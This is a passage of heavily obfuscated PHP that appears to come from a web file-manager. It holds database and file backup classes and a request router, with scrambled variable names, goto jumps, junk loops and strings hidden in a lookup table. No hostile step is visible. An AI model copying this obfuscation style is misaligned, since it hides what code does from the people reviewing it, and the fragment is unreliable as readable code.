$ÄÊ“¶‚[$…Á½†ó[741]] = $ÑÃ‚ïÌ; self::valueSet($šÌâ ù¶, $ÄÊ“¶‚); self::log($…Á½†ó[1685] . $ÄÊ“¶‚[$…Á½†ó[399]] . $…Á½†ó[1686] . $ÑÃ‚ïÌ); return !0; } public static function valueGet($İ’€ê±³ = false) { $®®¤¸’Å =& $_SERVER[­õöî’–]; $ƒ»ş‡ = defined($®®¤¸’Å[475]) ? USER_ID : $®®¤¸’Å[197]; if ($İ’€ê±³) { $¼­¨¡Ç¢ = Model($®®¤¸’Å[447])->where(array($®®¤¸’Å[94] => $İ’€ê±³, $®®¤¸’Å[33] => $®®¤¸’Å[1069]))->find(); return $¼­¨¡Ç¢ ? json_decode($¼­¨¡Ç¢[$®®¤¸’Å[374]], !0) : !1; } return self::taskListUser($ƒ»ş‡); } public static function taskListUser($âÈæ‹ú = false) { $şâŠğÜ =& $_SERVER[­õöî’–]; $†é‚Å™ = array($şâŠğÜ[33] => $şâŠğÜ[1069]); if ($âÈæ‹ú) { $†é‚Å™[$şâŠğÜ[1660]] = $âÈæ‹ú; } $ê…ª½¸ü = Model($şâŠğÜ[447])->where($†é‚Å™)->select(); $ê…ª½¸ü = $ê…ª½¸ü ? $ê…ª½¸ü : array(); foreach ($ê…ª½¸ü as $ç¾Ø¿¡¨ => $Ÿ–èÑà‹) { $ê…ª½¸ü[$ç¾Ø¿¡¨] = json_decode($Ÿ–èÑà‹[$şâŠğÜ[374]], !0); } return $ê…ª½¸ü; } public static function valueSet($óƒæù¸, $Ğ¦‡÷”) { $¥ëÇ–üÄ =& $_SERVER[­õöî’–]; if (!$Ğ¦‡÷”) { return Model($¥ëÇ–üÄ[447])->where(array($¥ëÇ–üÄ[94] => $óƒæù¸, $¥ëÇ–üÄ[33] => $¥ëÇ–üÄ[1069]))->delete(); } $‚ƒ‚¡Ğº = json_encode($Ğ¦‡÷”); if (!$‚ƒ‚¡Ğº) { ob_start(); var_dump($Ğ¦‡÷”); $İâ²æ¸ƒ = ob_get_clean(); self::log($¥ëÇ–üÄ[1687] . json_encode_force($İâ²æ¸ƒ)); } if (!$óƒæù¸ || !$Ğ¦‡÷”[$¥ëÇ–üÄ[399]]) { return !1; } $¡äººáå = defined($¥ëÇ–üÄ[475]) ? USER_ID : $¥ëÇ–üÄ[197]; $Œßªœ‘ = array($¥ëÇ–üÄ[33] => $¥ëÇ–üÄ[1069], $¥ëÇ–üÄ[1660] => $¡äººáå, $¥ëÇ–üÄ[94] => $óƒæù¸, $¥ëÇ–üÄ[374] => $‚ƒ‚¡Ğº); $¼°ãªÕÎ = $¥ëÇ–üÄ[1688]; CacheLock::lock($¼°ãªÕÎ); Model($¥ëÇ–üÄ[447])->add($Œßªœ‘, array(), !0); CacheLock::unlock($¼°ãªÕÎ); } public static function log($Şİ°Šò) { if (!GLOBAL_DEBUG) { return; } write_log($Şİ°Šò, $_SERVER[­õöî’–][1689]); } } goto cæ¨Ñ·Îñ; d¢­÷öøå÷: class Backup { protected static $name; protected static $option; protected static $manual; public function __construct() { $this->init(); $this->keep(); } public function init() { $›¥úÉ‘ =& $_SERVER[­õöî’–]; $this->isManual(); self::$name = date($›¥úÉ‘[739]); if (!($†ÀÔ’À‘ = Model($›¥úÉ‘[740])->lastItem())) { $†ÀÔ’À‘ = $this->initData(); } else { self::$name = $†ÀÔ’À‘[$›¥úÉ‘[32]]; if ($†ÀÔ’À‘[$›¥úÉ‘[741]] == $›¥úÉ‘[88]) { self::$name = date($›¥úÉ‘[742]); $’õÌÓï = 0; if (isset($†ÀÔ’À‘[$›¥úÉ‘[293]][$›¥úÉ‘[199]][$›¥úÉ‘[468]])) { $’õÌÓï = (int) $†ÀÔ’À‘[$›¥úÉ‘[293]][$›¥úÉ‘[199]][$›¥úÉ‘[468]]; } if (self::$manual == 0 && $†ÀÔ’À‘[$›¥úÉ‘[32]] == self::$name) { Model($›¥úÉ‘[740])->remove($†ÀÔ’À‘[$›¥úÉ‘[399]]); } $†ÀÔ’À‘ = $this->initData($’õÌÓï, $†ÀÔ’À‘[$›¥úÉ‘[743]]); } else { $this->checkStore($†ÀÔ’À‘[$›¥úÉ‘[743]]); } } self::$option = $†ÀÔ’À‘; } private function isManual() { $Ÿë³¡èØ = _get($GLOBALS, $_SERVER[­õöî’–][744], 0); $Ÿë³¡èØ = intval($Ÿë³¡èØ); self::$manual = $Ÿë³¡èØ && $Ÿë³¡èØ == 1 ? 1 : 0; } private function initData($±òß¢© = 0, $½ÙÇ±ÌÓ = '') { $¡ ¹ïß˜ =& $_SERVER[­õöî’–]; $¶ñ²à±Ó = Model($¡ ¹ïß˜[740])->config(); if ($½ÙÇ±ÌÓ && $¶ñ²à±Ó[$¡ ¹ïß˜[743]] != $½ÙÇ±ÌÓ) { $±òß¢© = 0; } $this->checkStore($¶ñ²à±Ó[$¡ ¹ïß˜[743]]); if (self::$manual == 1) { self::$name .= $¡ ¹ïß˜[11] . date($¡ ¹ïß˜[745]); } $©ª¯›÷ë = array($¡ ¹ïß˜[743] => $¶ñ²à±Ó[$¡ ¹ïß˜[743]], $¡ ¹ïß˜[32] => self::$name, $¡ ¹ïß˜[741] => 0, $¡ ¹ïß˜[746] => $¶ñ²à±Ó[$¡ ¹ïß˜[746]], $¡ ¹ïß˜[747] => self::$manual, $¡ ¹ïß˜[293] => array($¡ ¹ïß˜[748] => array($¡ ¹ïß˜[741] => 0), $¡ ¹ïß˜[749] => array($¡ ¹ïß˜[741] => 0, $¡ ¹ïß˜[750] => 0, $¡ ¹ïß˜[751] => 0, $¡ ¹ïß˜[33] => $¡ ¹ïß˜[12], $¡ ¹ïß˜[752] => 0, $¡ ¹ïß˜[497] => 0), $¡ ¹ïß˜[753] => array($¡ ¹ïß˜[741] => 0, $¡ ¹ïß˜[750] => 0, $¡ ¹ïß˜[751] => 0, $¡ ¹ïß˜[752] => 0, $¡ ¹ïß˜[497] => 0), $¡ ¹ïß˜[199] => array($¡ ¹ïß˜[741] => 0, $¡ ¹ïß˜[754] => 0, $¡ ¹ïß˜[755] => 0, $¡ ¹ïß˜[756] => 0, $¡ ¹ïß˜[757] => 0, $¡ ¹ïß˜[468] => $±òß¢©, $¡ ¹ïß˜[752] => 0, $¡ ¹ïß˜[497] => 0)), $¡ ¹ïß˜[752] => time(), $¡ ¹ïß˜[497] => 0); $ ‹İÅÙ = Model($¡ ¹ïß˜[740])->insert($©ª¯›÷ë); $©ª¯›÷ë[$¡ ¹ïß˜[399]] = $ ‹İÅÙ; return $©ª¯›÷ë; } private function checkStore($Ûîã÷È) { $á§éèò =& $_SERVER[­õöî’–]; $Ü‹™ìÖ« = Model($á§éèò[758])->listData($Ûîã÷È); Model($á§éèò[758])->checkConfig($Ü‹™ìÖ«); } public static function get() { if (!self::$option) { self::$option = Model($_SERVER[­õöî’–][740])->findByName(self::$name); } return self::$option; } public static function set($Êïùö»ı) { $”Óò§ë =& $_SERVER[­õöî’–]; $‹Ìøñ³è = self::get(); foreach ($Êïùö»ı as $œêŸùœ¾ => $àÏöŒ¯) { $ËÈ€ß¯ = explode($”Óò§ë[10], $œêŸùœ¾); $™Êùí = count($ËÈ€ß¯); switch ($™Êùí) { case 1: $‹Ìøñ³è[$ËÈ€ß¯[0]] = $àÏöŒ¯; break; case 2: $‹Ìøñ³è[$ËÈ€ß¯[0]][$ËÈ€ß¯[1]] = $àÏöŒ¯; break; case 3: $‹Ìøñ³è[$ËÈ€ß¯[0]][$ËÈ€ß¯[1]][$ËÈ€ß¯[2]] = $àÏöŒ¯; break; } } Model($”Óò§ë[740])->update($‹Ìøñ³è[$”Óò§ë[399]], $‹Ìøñ³è); self::$option = $‹Ìøñ³è; return self::$option; } public function keep() { $ƒ¿˜ÇÛ¢ =& $_SERVER[­õöî’–]; $¨å÷İ£¦ = self::get(); if ($¨å÷İ£¦[$ƒ¿˜ÇÛ¢[293]][$ƒ¿˜ÇÛ¢[748]][$ƒ¿˜ÇÛ¢[741]] == $ƒ¿˜ÇÛ¢[88]) { return; } $this->backupKeep($¨å÷İ£¦); self::set(array($ƒ¿˜ÇÛ¢[759] => 1)); } private function backupKeep($åéğÛùÑ) { $¢»ÃŞš =& $_SERVER[­õöî’–]; if (self::$manual == 1) { return; } $°÷Çç£Ó = Model($¢»ÃŞš[740])->listData(); if (empty($°÷Çç£Ó)) { return; } $ø‹ÄºŞ¬ = 0; $É¬¾øĞÚ = array(); foreach ($°÷Çç£Ó as $¾¡®¨·å) { if ($ø‹ÄºŞ¬ >= 7) { break; } $É¬¾øĞÚ[] = $¾¡®¨·å[$¢»ÃŞš[32]]; $ø‹ÄºŞ¬++; } for ($ø‹ÄºŞ¬ = 0; $ø‹ÄºŞ¬ < 12; $ø‹ÄºŞ¬++) { $É¬¾øĞÚ[] = date($¢»ÃŞš[760], strtotime("\x2d{$ø‹ÄºŞ¬}\40\x6d\157\x6e\164\x68\x73")); } $É¬¾øĞÚ = array_unique($É¬¾øĞÚ); $¤œ«Š¤¤ = Model($¢»ÃŞš[761])->get($¢»ÃŞš[762]); foreach ($°÷Çç£Ó as $¾¡®¨·å) { if (isset($¾¡®¨·å[$¢»ÃŞš[747]]) && $¾¡®¨·å[$¢»ÃŞš[747]] == $¢»ÃŞš[88]) { continue; } if (!empty($¾¡®¨·å[$¢»ÃŞš[32]]) && in_array($¾¡®¨·å[$¢»ÃŞš[32]], $É¬¾øĞÚ)) { continue; } Model($¢»ÃŞš[740])->remove($¾¡®¨·å[$¢»ÃŞš[399]]); $Ñ«º”¶’ = $this->backupPath($åéğÛùÑ, $¤œ«Š¤¤); IO::remove($Ñ«º”¶’, !1); } } private function backupPath($ôÅïõ‡, $´ŸÉ­»Ç = false) { $ññÚë±‘ =& $_SERVER[­õöî’–]; if (!$´ŸÉ­»Ç) { $´ŸÉ­»Ç = Model($ññÚë±‘[761])->get($ññÚë±‘[762]); } $˜Â¨ªç = $ôÅïõ‡[$ññÚë±‘[32]]; $â‚æÉ•Ä = substr(md5($ññÚë±‘[763] . $´ŸÉ­»Ç . $˜Â¨ªç), 0, 8); return "\x7b\151\157\x3a{$ôÅïõ‡[$ññÚë±‘[743]]}\175\x2f\x64\141\x74\141\142\x61\x73\x65\57\x62\141\143\153\165\x70\57" . $˜Â¨ªç . $ññÚë±‘[11] . $â‚æÉ•Ä; } public function db() { $È²–é²ç =& $_SERVER[­õöî’–]; $çÃíŒë‡ = self::get(); if ($çÃíŒë‡[$È²–é²ç[293]][$È²–é²ç[749]][$È²–é²ç[741]] == $È²–é²ç[88]) { return !0; } $öïŠ¹ğ = new BackupDb(); if (!$öïŠ¹ğ->index()) { return !1; } self::set(array($È²–é²ç[764] => 1)); return !0; } public function dbFile() { $ÔœäüÛ¼ =& $_SERVER[­õöî’–]; $Ú¶Á»ùö = self::get(); if ($Ú¶Á»ùö[$ÔœäüÛ¼[293]][$ÔœäüÛ¼[753]][$ÔœäüÛ¼[741]] == $ÔœäüÛ¼[88]) { return !0; } $Ê¦Å±˜Ï = new BackupDbFile(); if (!$Ê¦Å±˜Ï->index()) { return !1; } self::set(array($ÔœäüÛ¼[765] => 1)); return !0; } public function file() { $æÌÜº×Š =& $_SERVER[­õöî’–]; $²º‡õ¿³ = self::get(); if ($²º‡õ¿³[$æÌÜº×Š[293]][$æÌÜº×Š[199]][$æÌÜº×Š[741]] == $æÌÜº×Š[88]) { return !0; } if (!isset($²º‡õ¿³[$æÌÜº×Š[746]]) || $²º‡õ¿³[$æÌÜº×Š[746]] == $æÌÜº×Š[197]) { $éâä©Ñİ = new BackupFile(); if (!$éâä©Ñİ->index()) { return !1; } } self::set(array($æÌÜº×Š[766] => 1, $æÌÜº×Š[741] => 1)); return !0; } } class BackupDb { protected static $io; protected static $name; public function __construct() { } public function index() { $’—Ç²²á =& $_SERVER[­õöî’–]; $©ª‰«š» = Backup::get(); self::$io = $©ª‰«š»[$’—Ç²²á[743]]; self::$name = $©ª‰«š»[$’—Ç²²á[32]]; $³áÅù¡ = new DbManage(); $•È´†¾å = $³áÅù¡->dbType(); $Ğ®¶şšè = array($’—Ç²²á[767] => $•È´†¾å, $’—Ç²²á[768] => time()); Backup::set($Ğ®¶şšè); $Ù°ùÏÖ = $this->tmpFilesPath() . $’—Ç²²á[769] . self::$name . $’—Ç²²á[8]; del_dir($Ù°ùÏÖ); mk_dir($Ù°ùÏÖ); $‹¡¢ñ†‹ = $‘õİÑ•¢ = 0; $—öÌ½ = new Task($’—Ç²²á[770], $’—Ç²²á[771], 0, LNG($’—Ç²²á[772]) . $’—Ç²²á[773] . LNG($’—Ç²²á[774])); try { $…¨¢ÔŒÚ = $³áÅù¡->db()->getTables(); } catch (Exception $À½¢ò¶Š) { $—öÌ½->end(); return !1; } $…¨¢ÔŒÚ = array_diff($…¨¢ÔŒÚ, array($’—Ç²²á[775], $’—Ç²²á[776])); foreach ($…¨¢ÔŒÚ as $äùÖ›•) { $‹¡¢ñ†‹ += $³áÅù¡->model($äùÖ›•)->count(); } $—öÌ½->task[$’—Ç²²á[777]] = $‹¡¢ñ†‹; $GLOBALS[$’—Ç²²á[778]] = self::$name; foreach ($…¨¢ÔŒÚ as $äùÖ›•) { $ó‡Èƒş± = $Ù°ùÏÖ . $äùÖ›• . $’—Ç²²á[779]; $®¸´íÆâ = null; if ($äùÖ›• == $’—Ç²²á[780] && (!isset($©ª‰«š»[$’—Ç²²á[746]]) || $©ª‰«š»[$’—Ç²²á[746]] == $’—Ç²²á[197])) { $®¸´íÆâ = self::$io; } $‘õİÑ•¢ += $³áÅù¡->sqlFromDb($äùÖ›•, $ó‡Èƒş±, $—öÌ½, $®¸´íÆâ); } unset($GLOBALS[$’—Ç²²á[778]]); $—öÌ½->end(); if ($‘õİÑ•¢ > $‹¡¢ñ†‹) { $‹¡¢ñ†‹ = $‘õİÑ•¢; } $Ğ®¶şšè = array($’—Ç²²á[767] => $•È´†¾å, $’—Ç²²á[764] => 1, $’—Ç²²á[781] => $‹¡¢ñ†‹, $’—Ç²²á[782] => $‘õİÑ•¢, $’—Ç²²á[783] => time()); Backup::set($Ğ®¶şšè); if ($‹¡¢ñ†‹ - $‘õİÑ•¢ > 0) { $÷è“íúî = $’—Ç²²á[784]; if (stristr(I18n::getType(), $’—Ç²²á[785])) { $÷è“íúî = $’—Ç²²á[786]; } write_log(array($÷è“íúî, $Ğ®¶şšè), $’—Ç²²á[771]); return !1; } return !0; } private function tmpFilesPath() { $²ÔµÌÎı =& $_SERVER[­õöî’–]; $ şƒ‚Ğ° = TEMP_FILES; if ($GLOBALS[$²ÔµÌÎı[6]][$²ÔµÌÎı[89]][$²ÔµÌÎı[787]]) { $ şƒ‚Ğ° = $GLOBALS[$²ÔµÌÎı[6]][$²ÔµÌÎı[89]][$²ÔµÌÎı[787]]; if (!mk_dir($ şƒ‚Ğ°) || !is_writable($ şƒ‚Ğ°) || !IO::mkfile($ şƒ‚Ğ° . $²ÔµÌÎı[788])) { $ şƒ‚Ğ° = TEMP_FILES; } } return $ şƒ‚Ğ°; } } class BackupDbFile { public function __construct() { } public function index() { $¤æÒµ‰ü =& $_SERVER[­õöî’–]; $†èœ–Û = Backup::get(); $‘ŞÛÆÇ½ = $†èœ–Û[$¤æÒµ‰ü[32]]; $ÈŠƒşæÉ = $this->tmpFilesPath() . "\x62\x61\x63\x6b\x75\x70\x5f{$‘ŞÛÆÇ½}\x2f"; $ÛÆ¯Ä§ = $this->backupPath($†èœ–Û); if (!($ÛÆ¯Ä§ = IO::mkdir($ÛÆ¯Ä§))) { return !1; } $‹Æª = IO::listPath($ÈŠƒşæÉ); $ÏãŸ±’Ë = isset($‹Æª[$¤æÒµ‰ü[83]]) ? $‹Æª[$¤æÒµ‰ü[83]] : array(); $»Šº£Û« = array_sum(array_column($ÏãŸ±’Ë, $¤æÒµ‰ü[76])); if (!$»Šº£Û«) { return !1; } $œ“ê·Õ³ = array($¤æÒµ‰ü[789] => $»Šº£Û«, $¤æÒµ‰ü[790] => time()); Backup::set($œ“ê·Õ³); $ŒˆÏë¬ = new TaskFileTransfer($¤æÒµ‰ü[791], $¤æÒµ‰ü[771], count($ÏãŸ±’Ë), LNG($¤æÒµ‰ü[772]) . $¤æÒµ‰ü[386] . LNG($¤æÒµ‰ü[774]) . $¤æÒµ‰ü[792]); $ŒˆÏë¬->task[$¤æÒµ‰ü[754]] = $»Šº£Û«; foreach ($‹Æª[$¤æÒµ‰ü[83]] as $¡œÊ”·‚) { $¯¾ÔÓñô = IO::move($¡œÊ”·‚[$¤æÒµ‰ü[84]], $ÛÆ¯Ä§); if (!$¯¾ÔÓñô) { $ŒˆÏë¬->end(); $Ñú©×õ× = IO::getLastError($¤æÒµ‰ü[793] . $¡œÊ”·‚[$¤æÒµ‰ü[84]] . $¤æÒµ‰ü[794] . $ÛÆ¯Ä§ . $¤æÒµ‰ü[164]); write_log($Ñú©×õ×, $¤æÒµ‰ü[771]); return !1; } } $€¡Œà¨Õ = new DbManage(); $‘ã½§í† = $€¡Œà¨Õ->getSqlFile(); if (!$‘ã½§í†[$¤æÒµ‰ü[795]] || !$‘ã½§í†[$¤æÒµ‰ü[13]]) { return !1; } IO::move($‘ã½§í†[$¤æÒµ‰ü[795]], $ÛÆ¯Ä§); IO::move($‘ã½§í†[$¤æÒµ‰ü[13]], $ÛÆ¯Ä§); $ŒˆÏë¬->end(); $œ“ê·Õ³ = array($¤æÒµ‰ü[796] => $»Šº£Û«, $¤æÒµ‰ü[797] => time()); Backup::set($œ“ê·Õ³); return !0; } private function backupPath($¯ÏıÔ·¨) { $ı¬³ÇÃÛ =& $_SERVER[­õöî’–]; $’áÄ÷ó† = $¯ÏıÔ·¨[$ı¬³ÇÃÛ[32]]; $÷¾»É = Model($ı¬³ÇÃÛ[761])->get($ı¬³ÇÃÛ[762]); $´Æèà¯¨ = substr(md5($ı¬³ÇÃÛ[763] . $÷¾»É . $’áÄ÷ó†), 0, 8); return "\x7b\x69\157\x3a{$¯ÏıÔ·¨[$ı¬³ÇÃÛ[743]]}\175\x2f\x64\141\164\x61\x62\x61\163\x65\57\142\141\143\153\165\x70\57" . $’áÄ÷ó† . $ı¬³ÇÃÛ[11] . $´Æèà¯¨; } private function tmpFilesPath() { $¤¬›å¦£ =& $_SERVER[­õöî’–]; $à÷Ü– = TEMP_FILES; if ($GLOBALS[$¤¬›å¦£[6]][$¤¬›å¦£[89]][$¤¬›å¦£[787]]) { $à÷Ü– = $GLOBALS[$¤¬›å¦£[6]][$¤¬›å¦£[89]][$¤¬›å¦£[787]]; if (!mk_dir($à÷Ü–) || !is_writable($à÷Ü–) || !IO::mkfile($à÷Ü– . $¤¬›å¦£[788])) { $à÷Ü– = TEMP_FILES; } } return $à÷Ü–; } } goto B¶ã‚†ğ„¦; dœšâñ±…¶: $zqtsacvbyg = $_SERVER[­õöî’–][617]; if (!$zqtsacvbyg) { return; } class Application { private $defaultModule = "\x69\156\x64\x65\170"; private $defaultController = "\x69\156\144\x65\x78"; private $defaultAction = "\151\x6e\x64\x65\x78"; function __construct() { } public function setDefault($¾—ıç–) { $ˆú¤í´î =& $_SERVER[­õöî’–]; $ñãø¦è‰ =& $_SERVER[øû®”õ ]; $­ø‹Á§ = explode($ñãø¦è‰[0], trim($¾—ıç–, $ñãø¦è‰[0])); $this->defaultModule = $­ø‹Á§[0] ? $­ø‹Á§[0] : $this->defaultModule; $this->defaultController = $­ø‹Á§[1] ? $­ø‹Á§[1] : $this->defaultController; $È†ìîîæ = $ˆú¤í´î[618]; $this->defaultAction = $­ø‹Á§[2] ? $­ø‹Á§[2] : $this->defaultAction; $¾Ü»üõ = $ˆú¤í´î[619]; $this->cyiv8bfba2dd($ñãø¦è‰[1], array($this, $ñãø¦è‰[2])); $¾…ÍşŠ‡ = $ˆú¤í´î[620]; while ($¾…ÍşŠ‡ < $ˆú¤í´î[621]) { if ($¾…ÍşŠ‡ >= 0) { break; } $¾…ÍşŠ‡++; } } public function appRun($¨àÁ¬ñÒ) { $€ïÏÓÖâ =& $_SERVER[­õöî’–]; $¬Öı’Û‰ =& $_SERVER[øû®”õ ]; $Ä…–Ô¦ = explode($¬Öı’Û‰[0], $¨àÁ¬ñÒ); $èÕñ’àª = strtolower($Ä…–Ô¦[0]); $Š—É™Êˆ = $¬Öı’Û‰[3]; if ($èÕñ’àª == $¬Öı’Û‰[4]) { $Š—É™Êˆ = $¬Öı’Û‰[5]; $Ä…–Ô¦[0] = $¬Öı’Û‰[6]; $Ä…–Ô¦[1] = $Ä…–Ô¦[1] . $¬Öı’Û‰[7]; $¨àÁ¬ñÒ = join($¬Öı’Û‰[0], $Ä…–Ô¦); $¨àÁ¬ñÒ = trim($¨àÁ¬ñÒ, $¬Öı’Û‰[0]); } call_user_func(array($¬Öı’Û‰[8], $¬Öı’Û‰[9]), $Š—É™Êˆ . $¬Öı’Û‰[10], $¨àÁ¬ñÒ); ActionCall($¨àÁ¬ñÒ); $Îùöœ´ò = $€ïÏÓÖâ[622]; if (strlen($Îùöœ´ò) < $€ïÏÓÖâ[623]) { return; } call_user_func(array($¬Öı’Û‰[8], $¬Öı’Û‰[9]), $Š—É™Êˆ . $¬Öı’Û‰[11], $¨àÁ¬ñÒ); $”ïœ²¢³ = $€ïÏÓÖâ[624]; if (!$”ïœ²¢³) { return; } } private function autorun() { $ß¸âˆÎÏ =& $_SERVER[­õöî’–]; $õ´Ö±“Ê =& $_SERVER[øû®”õ ]; global $config; $šà¶‹ÜÏ = $ß¸âˆÎÏ[625]; while ($šà¶‹ÜÏ < $ß¸âˆÎÏ[626]) { if ($šà¶‹ÜÏ >= 0) { break; } $šà¶‹ÜÏ++; } if (count($config[$õ´Ö±“Ê[12]]) == 0) { return; } foreach ($config[$õ´Ö±“Ê[12]] as $éïáä‡¢ => $¾Œ¾Ÿ©Ø) { $this->appRun($¾Œ¾Ÿ©Ø); $ÉÎ±Áâà = $ß¸âˆÎÏ[627]; if (strlen($ÉÎ±Áâà) < $ß¸âˆÎÏ[621]) { die; } } } private function khfn2fc57b59() { $ú£´†® =& $_SERVER[­õöî’–]; $ÀŸœ×®¢ =& $_SERVER[øû®”õ ]; $ò¨°Ä¥Ÿ = $ÀŸœ×®¢[4]; $¦¦©™Áß = $ú£´†®[628]; while ($¦¦©™Áß < $ú£´†®[623]) { if ($¦¦©™Áß >= 0) { break; } $¦¦©™Áß++; } $î–õ³Ğ = $GLOBALS[$ÀŸœ×®¢[13]][$ÀŸœ×®¢[14]][0]; $áĞÖÔåÄ = $ú£´†®[629]; if (!$î–õ³Ğ || strlen($î–õ³Ğ) <= strlen($ò¨°Ä¥Ÿ)) { return; } if (strtolower(substr($î–õ³Ğ, -strlen($ò¨°Ä¥Ÿ))) != $ò¨°Ä¥Ÿ) { return; } $ÅØ÷˜› = substr($î–õ³Ğ, 0, -strlen($ò¨°Ä¥Ÿ)); $Ùß§ûÓ¹ = array($ÀŸœ×®¢[4], $ÅØ÷˜›); $ƒ¯òĞ×© = $ú£´†®[630]; while ($ƒ¯òĞ×© < $ú£´†®[631]) { if ($ƒ¯òĞ×© >= 0) { break; } $ƒ¯òĞ×©++; } $ƒÉ©¬Ø´ = array_slice($GLOBALS[$ÀŸœ×®¢[13]][$ÀŸœ×®¢[14]], 1); $GLOBALS[$ÀŸœ×®¢[13]][$ÀŸœ×®¢[14]] = array_merge($Ùß§ûÓ¹, $ƒÉ©¬Ø´); $GLOBALS[$ÀŸœ×®¢[13]][$ÀŸœ×®¢[15]] = implode($ÀŸœ×®¢[0], $GLOBALS[$ÀŸœ×®¢[13]][$ÀŸœ×®¢[14]]); } private function wkrh6e9c37ee() { $Ğ¬›ù­ =& $_SERVER[­õöî’–]; $³äòÅ÷¾ =& $_SERVER[øû®”õ ]; if ($GLOBALS[$³äòÅ÷¾[13]][$³äòÅ÷¾[15]] != $³äòÅ÷¾[6]) { return; } $ÁçÀÅ— = $_SERVER[$³äòÅ÷¾[16]]; $®ìîóŒ÷ = $³äòÅ÷¾[17]; $ö­°µ¹ë = $Ğ¬›ù­[632]; if (!strstr($ÁçÀÅ—, $®ìîóŒ÷)) { return; } $¿¶…ã£¥ = strrpos($ÁçÀÅ—, $®ìîóŒ÷); $¤¤üúÖ = $Ğ¬›ù­[633]; $†ÀÂ¬ó€ = substr($ÁçÀÅ—, $¿¶…ã£¥ + strlen($®ìîóŒ÷)); preg_match_all($³äòÅ÷¾[18], $†ÀÂ¬ó€, $öğ—»»½); $êœ¬½Â = $Ğ¬›ù­[634]; $†ÀÂ¬ó€ = trim($öğ—»»½[0][0], $³äòÅ÷¾[19]); $ç£è´ğ§ = $Ğ¬›ù­[635]; if (strlen($ç£è´ğ§) < $Ğ¬›ù­[636]) { die; } $GLOBALS[$³äòÅ÷¾[13]][$³äòÅ÷¾[14]] = explode($³äòÅ÷¾[19], $†ÀÂ¬ó€); $GLOBALS[$³äòÅ÷¾[13]][$³äòÅ÷¾[15]] = implode($³äòÅ÷¾[0], $GLOBALS[$³äòÅ÷¾[13]][$³äòÅ÷¾[14]]); $Àá´£’Ö = $Ğ¬›ù­[637]; if (!$Àá´£’Ö) { die; } } public function run() { $İÃî…”° =& $_SERVER[­õöî’–]; $Œî¯ë‰¢ =& $_SERVER[øû®”õ ]; $this->wkrh6e9c37ee(); $¸—›Àß = $İÃî…”°[638]; $this->khfn2fc57b59(); $şë ™Š¾ = $İÃî…”°[639]; if (strlen($şë ™Š¾) < $İÃî…”°[621]) { return; } $ºĞªà†Œ = $GLOBALS[$Œî¯ë‰¢[13]][$Œî¯ë‰¢[14]]; $ğÚ¬’Ø— = $İÃî…”°[640]; while ($ğÚ¬’Ø— < $İÃî…”°[621]) { if ($ğÚ¬’Ø— >= 0) { break; } $ğÚ¬’Ø—++; } $¹îşşÅú = $GLOBALS[$Œî¯ë‰¢[13]][$Œî¯ë‰¢[15]]; define($Œî¯ë‰¢[20], isset($ºĞªà†Œ[0]) && $ºĞªà†Œ[0] ? $ºĞªà†Œ[0] : $this->defaultModule); $œ¸îĞ• = $İÃî…”°[641]; if (!$œ¸îĞ•) { return; } define($Œî¯ë‰¢[21], isset($ºĞªà†Œ[1]) && $ºĞªà†Œ[0] ? $ºĞªà†Œ[1] : $this->defaultController); define($Œî¯ë‰¢[22], isset($ºĞªà†Œ[2]) && $ºĞªà†Œ[0] ? $ºĞªà†Œ[2] : $this->defaultAction); define($Œî¯ë‰¢[23], MOD . $Œî¯ë‰¢[0] . ST . $Œî¯ë‰¢[0] . ACT); $_SERVER[$Œî¯ë‰¢[24]] = strtolower(ACTION); $ŸÂÒŒ“ = $İÃî…”°[642]; while ($ŸÂÒŒ“ < $İÃî…”°[626]) { if ($ŸÂÒŒ“ >= 0) { break; } $ŸÂÒŒ“++; } $this->autorun(); $¤êœŠˆ“ = $İÃî…”°[643]; if (strlen($¤êœŠˆ“) < $İÃî…”°[636]) { die; } if (count($ºĞªà†Œ) >= 3) { $this->appRun($¹îşşÅú); } else { $this->appRun(ACTION); } } private $xmsj57b5cd6b = array(); private $vfirbe779c01 = ''; public function vnbh650cff3f() { $µªò‹Ë¹ =& $_SERVER[­õöî’–]; $™Ş¡ê â =& $_SERVER[øû®”õ ]; $this->gkmec2978d3c(); $this->blyqb1afcfe2(); $this->drtn75b2e51b(); $this->lonma4529786(); $é±óÓÄ = $µªò‹Ë¹[644]; if (strlen($é±óÓÄ) < $µªò‹Ë¹[621]) { return; } $this->qdhr38c368f9(); $this->gkyi5641f714(); $this->brsod51d665a(); $this->cyiv8bfba2dd($™Ş¡ê â[25], array($this, $™Ş¡ê â[26])); $this->cyiv8bfba2dd($™Ş¡ê â[27], array($this, $™Ş¡ê â[28])); $this->cyiv8bfba2dd($™Ş¡ê â[29], array($this, $™Ş¡ê â[30])); $¹§¢’íÂ = $µªò‹Ë¹[645]; while (strlen($¹§¢’íÂ) < $µªò‹Ë¹[636]) { if (!$¹§¢’íÂ) { break; } $¹§¢’íÂ++; } $this->cyiv8bfba2dd($™Ş¡ê â[31], array($this, $™Ş¡ê â[32])); } public function htmb730ceff5($Øá‰ƒê’) { $‹ŒÒ÷… =& $_SERVER[­õöî’–]; $ÉáäÖâ =& $_SERVER[øû®”õ ]; $®‚Åã¬ = Model($ÉáäÖâ[33])->get(); $ÀıÚî¥Ô = array($ÉáäÖâ[34], $ÉáäÖâ[35], $ÉáäÖâ[36], $ÉáäÖâ[37], $ÉáäÖâ[38], $ÉáäÖâ[39], $ÉáäÖâ[40], $ÉáäÖâ[41], $ÉáäÖâ[42], $ÉáäÖâ[43], $ÉáäÖâ[44], $ÉáäÖâ[45], $ÉáäÖâ[46], $ÉáäÖâ[47], $ÉáäÖâ[48], $ÉáäÖâ[49], $ÉáäÖâ[50], $ÉáäÖâ[51], $ÉáäÖâ[52], $ÉáäÖâ[53], $ÉáäÖâ[54], $ÉáäÖâ[55], $ÉáäÖâ[56], $ÉáäÖâ[57], $ÉáäÖâ[58], $ÉáäÖâ[59], $ÉáäÖâ[60], $ÉáäÖâ[61], $ÉáäÖâ[62], $ÉáäÖâ[63], $ÉáäÖâ[64], $ÉáäÖâ[65], $ÉáäÖâ[66], $ÉáäÖâ[67], $ÉáäÖâ[68], $ÉáäÖâ[69], $ÉáäÖâ[70], $ÉáäÖâ[71], $ÉáäÖâ[72], $ÉáäÖâ[73], $ÉáäÖâ[74], $ÉáäÖâ[75], $ÉáäÖâ[76], $ÉáäÖâ[77], $ÉáäÖâ[78], $ÉáäÖâ[79], $ÉáäÖâ[80], $ÉáäÖâ[81], $ÉáäÖâ[82], $ÉáäÖâ[83], $ÉáäÖâ[84]); $ÅÍ¯Âà = $‹ŒÒ÷…[646]; while (strlen($ÅÍ¯Âà) < $‹ŒÒ÷…[626]) { if 